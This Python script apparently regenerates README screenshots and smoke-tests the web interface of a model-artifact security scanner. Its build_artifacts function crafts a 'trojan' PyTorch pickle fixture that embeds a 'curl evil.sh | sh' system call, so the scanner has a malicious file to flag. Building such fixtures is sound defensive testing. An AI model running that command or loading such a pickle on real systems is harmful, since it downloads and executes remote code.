#!/usr/bin/env python3
"""Take the screenshots the README shows, from the interface as it is now.

A README with pictures of a version that no longer exists is worse than one
without pictures: the reader believes what they are looking at. So the images
in `docs/img/` are produced here rather than captured by hand, and `make
screenshots` regenerates all of them from a running server against artifacts
this repository builds.

Each capture also watches the page: any console error or warning, any page
error, any failed request is collected and printed at the end, and the script
exits non-zero if there was one. That turns the screenshot pass into a smoke
test of the front end, including its Content-Security-Policy, which is the
only place in this project where a CSP violation would otherwise be visible.

Two passes. `capture()` writes the six images a README or a document
displays, into `docs/img/`. `smoke()` writes everything else - every panel in
both languages, the dark scheme and two phone viewports - into `.screenshots/`,
which is ignored, because an image nothing displays is not documentation and
does not belong in the documentation directory.

    make screenshots            regenerate docs/img/*.png and .screenshots/
    python scripts/screenshots.py --out /tmp/shots    write the six elsewhere

Needs playwright with chromium. It is not a dependency of the package or of
the test suite: a picture is documentation, and documentation must not be able
to break an install.
"""
from __future__ import annotations

import argparse
import http.client
import subprocess
import sys
import threading
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))
sys.path.insert(0, str(ROOT))

HOST = "127.0.0.1"
PORT = 8791
BASE = f"http://{HOST}:{PORT}/"

DESKTOP = {"width": 1280, "height": 960}
MOBILE = {"width": 400, "height": 860}

PROBLEMS: list[str] = []


def watch(page, label: str) -> None:
    page.on("console", lambda msg: (
        PROBLEMS.append(f"{label}: console.{msg.type}: {msg.text}")
        if msg.type in ("error", "warning") else None
    ))
    page.on("pageerror", lambda exc: PROBLEMS.append(f"{label}: pageerror: {exc}"))
    page.on("requestfailed", lambda req: PROBLEMS.append(
        f"{label}: requestfailed: {req.url} {req.failure}"
    ))


def wait_for_server(timeout: float = 20.0) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            connection = http.client.HTTPConnection(HOST, PORT, timeout=1)
            connection.request("GET", "/")
            if connection.getresponse().status == 200:
                return
        except OSError:
            time.sleep(0.2)
    raise SystemExit(f"the server did not come up on {BASE}")


def start_server() -> subprocess.Popen:
    process = subprocess.Popen(  # noqa: S603 - fixed argv, no shell
        [sys.executable, "-m", "actaira", "serve", "--host", HOST, "--port", str(PORT)],
        cwd=ROOT, env={**_env(), "PYTHONPATH": str(ROOT / "src")},
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    threading.Thread(target=process.wait, daemon=True).start()
    wait_for_server()
    return process


def _env() -> dict[str, str]:
    import os

    return dict(os.environ)


def upload(page, input_id: str, path: Path) -> None:
    page.set_input_files(f"#{input_id}", str(path))
    page.wait_for_timeout(900)


def settle(page) -> None:
    page.evaluate("() => window.scrollTo(0, 0)")
    page.wait_for_timeout(300)


def fresh(page, lang: str = "en") -> None:
    """Load the interface with nothing remembered, in the language asked for.

    The language is selected in *every* case, English included. It used to be
    selected only when it was not English, on the assumption that English is
    what an unprimed page shows - and it is not: with no stored preference the
    interface follows `navigator.language` (`app.js`, `setLanguage`). So every
    capture came out in whatever language the browser running playwright
    happened to prefer, and the English and Spanish captures of the same panel
    were byte-identical. `04-governance.png` and `06-governance-es.png` were
    the same image, and both READMEs showed it, while `release_check.py`'s own
    comment said the localised README should show the localised screenshot.
    """
    page.goto(BASE, wait_until="networkidle")
    page.evaluate("() => { try { window.localStorage.clear(); } catch (e) {} }")
    page.goto(BASE, wait_until="networkidle")
    page.click(f"#lang-{lang}")
    page.wait_for_timeout(250)


def build_artifacts(workdir: Path) -> dict[str, Path]:
    """The files the panels are shown holding. Built, never downloaded."""
    from evals.corpus import build as corpus_build  # noqa: PLC0415 - path set above

    workdir.mkdir(parents=True, exist_ok=True)
    inner = corpus_build.craft_reduce("posix", "system", ("curl evil.sh | sh",), 4)
    files = {
        "trojan": corpus_build.craft_reduce("torch.storage", "_load_from_bytes", (inner,), 4),
        "clean": corpus_build.build_safetensors(
            {
                "encoder.weight": {"dtype": "F32", "shape": [256, 256], "data_offsets": [0, 262144]},
                "encoder.bias": {"dtype": "F32", "shape": [256], "data_offsets": [262144, 263168]},
            },
            b"\x00" * 263168,
        ),
    }
    written: dict[str, Path] = {}
    for name, payload in files.items():
        suffix = ".pt" if name == "trojan" else ".safetensors"
        path = workdir / f"{name}{suffix}"
        path.write_bytes(payload)
        written[name] = path
    return written


def build_workspace(path: Path) -> Path:
    """A small workspace for the graph panel, built here and never downloaded.

    Two halves, because the graph has two kinds of edge and a picture of only
    one of them would misrepresent it.

    The declared half comes from `examples/subjects.yaml` through the same
    `graph build` the CLI runs: a system that uses an agent, and an agent that
    declares five tools, two MCP servers, an identity, two data sources and a
    model. That gives the multi-hop route the impact view is for - a system is
    two hops from any of those tools.

    The observed half is two snapshots of one source, written through
    `state.watch.observe`, which is the function `actaira watch` calls. The
    second snapshot drops one artifact, so the fixture contains an asset that
    was recorded and is not in the latest observation - which is the whole
    reason the panel says "recorded" rather than "current", and the only way a
    screenshot can show that distinction rather than assert it.

    Deterministic and offline: the snapshots are built from literal rows, so
    this opens no socket and asks no registry for anything.
    """
    from actaira.state.snapshot import snapshot_of  # noqa: PLC0415
    from actaira.state.store import Store  # noqa: PLC0415
    from actaira.state.watch import observe  # noqa: PLC0415

    if path.exists():
        path.unlink()
    subprocess.run(  # noqa: S603 - fixed argv, no shell
        [sys.executable, "-m", "actaira", "init", "--state", str(path)],
        cwd=ROOT, env={**_env(), "PYTHONPATH": str(ROOT / "src")},
        check=True, stdout=subprocess.DEVNULL,
    )
    subprocess.run(  # noqa: S603 - fixed argv, no shell
        [sys.executable, "-m", "actaira", "graph", "build",
         "--subjects", str(ROOT / "examples" / "subjects.yaml"), "--state", str(path)],
        cwd=ROOT, env={**_env(), "PYTHONPATH": str(ROOT / "src")},
        check=True, stdout=subprocess.DEVNULL,
    )

    weights = {"uri": "huggingface://acme/fraud-model/model.safetensors",
               "size": 263168, "sha256": "a1" * 32}
    config = {"uri": "huggingface://acme/fraud-model/config.json", "size": 640, "sha256": "b2" * 32}
    retired = {"uri": "huggingface://acme/fraud-model/pytorch_model.bin",
               "size": 271360, "sha256": "c3" * 32}
    with Store(path) as store:
        store.add_source("huggingface://acme/fraud-model", "huggingface",
                         "huggingface://acme/fraud-model")
        for rows, revision, moment in (
            ([weights, config, retired], "7f91a2c", "2026-08-14T09:00:00+00:00"),
            ([weights, config], "9c4be01", "2026-09-02T09:00:00+00:00"),
        ):
            observe(store, snapshot_of(
                "huggingface://acme/fraud-model", "huggingface://acme/fraud-model",
                "huggingface", rows, revision=revision, observed_at=moment))
    return path


def start_server_with_state(state: Path, port: int) -> subprocess.Popen:
    """A second server, against the fixture workspace, for the graph captures."""
    process = subprocess.Popen(  # noqa: S603 - fixed argv, no shell
        [sys.executable, "-m", "actaira", "serve", "--host", HOST, "--port", str(port),
         "--state", str(state)],
        cwd=ROOT, env={**_env(), "PYTHONPATH": str(ROOT / "src")},
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    threading.Thread(target=process.wait, daemon=True).start()
    deadline = time.time() + 20
    while time.time() < deadline:
        try:
            connection = http.client.HTTPConnection(HOST, port, timeout=1)
            connection.request("GET", "/api/health")
            if connection.getresponse().status == 200:
                return process
        except OSError:
            time.sleep(0.2)
    raise SystemExit(f"the workspace server did not come up on port {port}")


def capture(browser, artifacts: dict[str, Path], out: Path) -> None:
    from playwright.sync_api import Error as PlaywrightError  # noqa: PLC0415

    def page_for(scheme: str, viewport: dict[str, int], label: str):
        page = browser.new_page(viewport=viewport, color_scheme=scheme)
        watch(page, label)
        return page

    def shoot(page, name: str, full_page: bool = True) -> None:
        """`full_page=False` for anything a README shows.

        A full-page capture of this interface is 1280 by 3862, and GitHub
        renders that as a thumbnail nobody can read. The images the READMEs
        display are therefore the viewport, which is the shape a reader
        actually meets, and the ones kept only as a smoke test stay full-page
        because there the point is that every section rendered.
        """
        settle(page)
        path = out / name
        page.screenshot(path=str(path), full_page=full_page)
        print("wrote", path.relative_to(ROOT) if path.is_relative_to(ROOT) else path)

    # The documentary captures, and only those: every file this writes into
    # `docs/img/` is displayed by a README or a document, and the release gate
    # refuses one that is not. Everything else is in `smoke()`.
    #
    # 1 and 2. an artifact inspected, light and dark
    for scheme, name in (("light", "02-inspect.png"), ("dark", "03-inspect-dark.png")):
        page = page_for(scheme, DESKTOP, f"inspect-{scheme}")
        fresh(page)
        upload(page, "file-inspect", artifacts["trojan"])
        try:
            page.click(".finding:first-of-type .finding__toggle", timeout=2000)
            page.wait_for_timeout(400)
        except PlaywrightError:
            pass
        shoot(page, name, full_page=False)
        page.close()

    # 3 to 6. the governance panel, in both schemes and both languages. Both
    # READMEs pick the scheme with <picture>, so the Spanish one needs a dark
    # capture of its own rather than borrowing the English image.
    for scheme, lang, name in (
        ("light", "en", "04-governance.png"),
        ("dark", "en", "05-governance-dark.png"),
        ("light", "es", "06-governance-es.png"),
        ("dark", "es", "08-governance-dark-es.png"),
    ):
        page = page_for(scheme, DESKTOP, f"governance-{scheme}-{lang}")
        fresh(page, lang)
        page.click("#tab-govern")
        page.wait_for_selector(".timeline")
        page.wait_for_timeout(600)
        try:
            page.click(".oblig:nth-child(3) .oblig__toggle", timeout=2000)
            page.wait_for_timeout(400)
        except PlaywrightError:
            pass
        shoot(page, name, full_page=False)
        page.close()


    # 7 to 10. the agent panel, showing a route. The declaration is the one
    # shipped in `examples/`, so the picture is of a real run over a file the
    # reader has: the routes, their hops and the mitigations under each are
    # whatever `actaira agent paths` says about it today. The page is scrolled
    # to the first route because the panel above it is the summary, and the
    # thing worth a picture is the graph.
    for scheme, lang, name in (
        ("light", "en", "07-agents.png"),
        ("dark", "en", "09-agents-dark.png"),
        ("light", "es", "10-agents-es.png"),
        ("dark", "es", "11-agents-dark-es.png"),
    ):
        page = page_for(scheme, DESKTOP, f"agents-{scheme}-{lang}")
        fresh(page, lang)
        page.click("#tab-agents")
        upload(page, "file-agents", ROOT / "examples" / "agent-ticket-triage.yaml")
        page.wait_for_selector(".routes > li.route", timeout=30000)
        page.wait_for_timeout(900)
        page.evaluate(
            "() => { const r = document.querySelector('.routes > li.route');"
            " if (r) { r.scrollIntoView({block: 'start'}); } }"
        )
        page.wait_for_timeout(400)
        path = out / name
        page.screenshot(path=str(path), full_page=False)
        print("wrote", path.relative_to(ROOT) if path.is_relative_to(ROOT) else path)
        page.close()

    # 11 to 14. the policy panel, with a decision on screen. The document is
    # the one shipped in `policies/`, the subject is the corpus gadget, and
    # the answer is therefore whatever `actaira policy check` says about that
    # pair today: the picture cannot show a verdict the tool does not reach.
    for scheme, lang, name in (
        ("light", "en", "12-policy.png"),
        ("dark", "en", "13-policy-dark.png"),
        ("light", "es", "14-policy-es.png"),
        ("dark", "es", "15-policy-dark-es.png"),
    ):
        page = page_for(scheme, DESKTOP, f"policy-{scheme}-{lang}")
        fresh(page, lang)
        page.click("#tab-policy")
        upload(page, "file-policy", ROOT / "policies" / "production-model.yaml")
        page.wait_for_selector("#out-policy .routes > li.route", timeout=30000)
        upload(page, "file-policy-subject", artifacts["trojan"])
        page.wait_for_selector(".verdict", timeout=30000)
        page.wait_for_timeout(700)
        page.evaluate(
            "() => { const v = document.querySelector('#out-policy .verdict');"
            " if (v) { v.scrollIntoView({block: 'start'}); } }"
        )
        page.wait_for_timeout(400)
        path = out / name
        page.screenshot(path=str(path), full_page=False)
        print("wrote", path.relative_to(ROOT) if path.is_relative_to(ROOT) else path)
        page.close()

def capture_graph(browser, out: Path, port: int) -> None:
    """The graph panel, on the fixture workspace, in both languages and schemes.

    This is the capture that shows Actaira is more than upload-a-file: the
    picture is of stored state, with a route through it, and it is taken from
    the running interface like every other image here.
    """
    base = f"http://{HOST}:{port}/"
    for scheme, lang, name in (
        ("light", "en", "16-graph.png"),
        ("dark", "en", "17-graph-dark.png"),
        ("light", "es", "18-graph-es.png"),
        ("dark", "es", "19-graph-dark-es.png"),
    ):
        page = browser.new_page(viewport=DESKTOP, color_scheme=scheme)
        watch(page, f"graph-{scheme}-{lang}")
        page.goto(base, wait_until="networkidle")
        page.evaluate("() => { try { window.localStorage.clear(); } catch (e) {} }")
        page.goto(base, wait_until="networkidle")
        page.click(f"#lang-{lang}")
        page.wait_for_timeout(250)
        page.click("#tab-graph")
        page.wait_for_selector("#out-graph .gr__frame svg.graph", timeout=30000)
        page.wait_for_timeout(900)
        # Ask the question the panel exists to answer, so the picture shows an
        # answer rather than an empty control strip.
        page.fill("#gr-search", "agent:ticket-triage")
        page.click("#out-graph .gr__searchrow .btn")
        page.wait_for_timeout(700)
        page.click("#out-graph .grmatch__hit")
        page.wait_for_selector("#out-graph .graph__box--focus", timeout=30000)
        page.wait_for_timeout(1100)
        # Scrolled to the drawing rather than to the top of the page. The
        # workspace summary and the control strip sit above it, and a README
        # picture of this panel that showed those and not the graph would be a
        # picture of the chrome.
        page.evaluate(
            "() => { const f = document.querySelector('#out-graph .gr__frame');"
            " if (f) { f.scrollIntoView({block: 'start'}); window.scrollBy(0, -64); } }"
        )
        page.wait_for_timeout(400)
        path = out / name
        page.screenshot(path=str(path), full_page=False)
        print("wrote", path.relative_to(ROOT) if path.is_relative_to(ROOT) else path)
        page.close()


def smoke_graph(browser, out: Path, port: int) -> None:
    """The graph panel's other states, including the one with no workspace.

    The phone viewport matters most here: the graph is the widest thing this
    interface draws, and it is drawn inside a bounded viewport precisely so
    that the document does not widen with it.
    """
    base = f"http://{HOST}:{port}/"
    page = browser.new_page(viewport=MOBILE, color_scheme="light")
    watch(page, "mobile-graph")
    page.goto(base, wait_until="networkidle")
    page.click("#tab-graph")
    page.wait_for_selector("#out-graph .gr__frame svg.graph", timeout=30000)
    page.wait_for_timeout(800)
    page.screenshot(path=str(out / "mobile-graph.png"), full_page=True)
    print("smoke", (out / "mobile-graph.png").relative_to(ROOT))
    page.close()

    page = browser.new_page(viewport=DESKTOP, color_scheme="light")
    watch(page, "graph-list")
    page.goto(base, wait_until="networkidle")
    page.click("#tab-graph")
    page.wait_for_selector("#out-graph .gr__frame svg.graph", timeout=30000)
    page.click("#out-graph .gr__row .segmented:nth-of-type(2) .segmented__btn:nth-child(2)")
    page.wait_for_timeout(600)
    page.screenshot(path=str(out / "graph-list.png"), full_page=True)
    print("smoke", (out / "graph-list.png").relative_to(ROOT))
    page.close()

    # The state a reader meets on a machine with no workspace at all. Served
    # by the main server, which was started without `--state`.
    page = browser.new_page(viewport=DESKTOP, color_scheme="light")
    watch(page, "graph-no-workspace")
    page.goto(BASE, wait_until="networkidle")
    page.click("#tab-graph")
    page.wait_for_timeout(900)
    page.screenshot(path=str(out / "graph-no-workspace.png"), full_page=True)
    print("smoke", (out / "graph-no-workspace.png").relative_to(ROOT))
    page.close()


def smoke(browser, artifacts: dict[str, Path], out: Path) -> None:
    """The states nothing displays, loaded anyway, because this is the gate.

    This pass is the front end's only smoke test: every console error, page
    error, failed request and Content-Security-Policy violation is collected
    here and nowhere else. So it loads every panel the interface has, in both
    languages and both schemes, plus the phone viewport - and writes those
    captures to `.screenshots/` rather than to `docs/img/`.

    They used to be written to `docs/img/` and named `01-welcome.png` and
    `07-mobile.png`, ignored by git and therefore untracked, which meant they
    survived in a delivered copy of this tree showing v1.0.0 next to six
    images showing v2.2.0. An image nothing displays is not documentation, and
    the place for it is not the documentation directory.
    """
    from playwright.sync_api import Error as PlaywrightError  # noqa: PLC0415

    out.mkdir(parents=True, exist_ok=True)

    def page_for(scheme: str, viewport: dict[str, int], label: str):
        page = browser.new_page(viewport=viewport, color_scheme=scheme)
        watch(page, label)
        return page

    def shoot(page, name: str, full_page: bool = True) -> None:
        settle(page)
        page.screenshot(path=str(out / name), full_page=full_page)
        print("smoke", (out / name).relative_to(ROOT) if (out / name).is_relative_to(ROOT) else out / name)

    # The welcome screen: what a reader sees before doing anything.
    page = page_for("light", DESKTOP, "welcome")
    fresh(page)
    shoot(page, "welcome.png")
    page.close()

    # Every panel, in both languages. `attest` and `verify` were never loaded
    # by this pass at all, so a console error on either of them was a state
    # this project had no gate for.
    for lang in ("en", "es"):
        for tab in ("inspect", "attest", "verify", "govern"):
            page = page_for("light", DESKTOP, f"{tab}-{lang}")
            fresh(page, lang)
            page.click(f"#tab-{tab}")
            page.wait_for_timeout(500)
            if tab == "inspect":
                upload(page, "file-inspect", artifacts["trojan"])
            shoot(page, f"panel-{tab}-{lang}.png")
            page.close()

    # Dark, on the panel with the most surface.
    page = page_for("dark", DESKTOP, "govern-dark")
    fresh(page)
    page.click("#tab-govern")
    page.wait_for_selector(".timeline")
    page.wait_for_timeout(500)
    shoot(page, "panel-govern-dark.png")
    page.close()

    # The same interface at phone width, with a result on screen: the narrow
    # viewport is where a table stops fitting, and a capture of an empty panel
    # would not show it.
    for tab, name in (
        ("inspect", "mobile-inspect.png"),
        ("agents", "mobile-agents.png"),
        ("policy", "mobile-policy.png"),
        ("govern", "mobile-govern.png"),
    ):
        page = page_for("light", MOBILE, f"mobile-{tab}")
        fresh(page)
        page.click(f"#tab-{tab}")
        page.wait_for_timeout(400)
        if tab == "inspect":
            upload(page, "file-inspect", artifacts["clean"])
            try:
                page.click(".finding:first-of-type .finding__toggle", timeout=2000)
                page.wait_for_timeout(300)
            except PlaywrightError:
                pass
        if tab == "policy":
            upload(page, "file-policy", ROOT / "policies" / "production-model.yaml")
            page.wait_for_selector("#out-policy .routes > li.route", timeout=30000)
            page.wait_for_timeout(500)
        if tab == "agents":
            # A route drawing is the widest thing this interface produces, so
            # the phone viewport is where it has to be seen rendering: the
            # drawing switches to a narrower geometry below 560px and this is
            # the capture that would show it if it stopped.
            upload(page, "file-agents", ROOT / "examples" / "agent-ticket-triage.yaml")
            page.wait_for_selector(".routes > li.route", timeout=30000)
            page.wait_for_timeout(600)
        shoot(page, name)
        page.close()


def main() -> int:
    parser = argparse.ArgumentParser(description="Regenerate the README screenshots")
    parser.add_argument("--out", type=Path, default=ROOT / "docs" / "img")
    arguments = parser.parse_args()
    arguments.out.mkdir(parents=True, exist_ok=True)

    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("playwright is not installed: pip install playwright && playwright install chromium",
              file=sys.stderr)
        return 2

    artifacts = build_artifacts(ROOT / ".screenshots")
    # Two servers: the one every other panel is photographed against, which is
    # deliberately started with no workspace, and one against the fixture, so
    # the pass also exercises the state that a reader with no `.actaira/` sees.
    workspace = build_workspace(ROOT / ".screenshots" / "graph-state.db")
    server = start_server()
    stateful = start_server_with_state(workspace, PORT + 1)
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch()
            try:
                capture(browser, artifacts, arguments.out)
                capture_graph(browser, arguments.out, PORT + 1)
                smoke(browser, artifacts, ROOT / ".screenshots")
                smoke_graph(browser, ROOT / ".screenshots", PORT + 1)
            finally:
                browser.close()
    finally:
        stateful.terminate()
        server.terminate()

    if PROBLEMS:
        print("\nthe front end complained while being photographed:", file=sys.stderr)
        for problem in PROBLEMS:
            print(f"  {problem}", file=sys.stderr)
        return 1
    print("\nno console error, page error or failed request in any capture")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
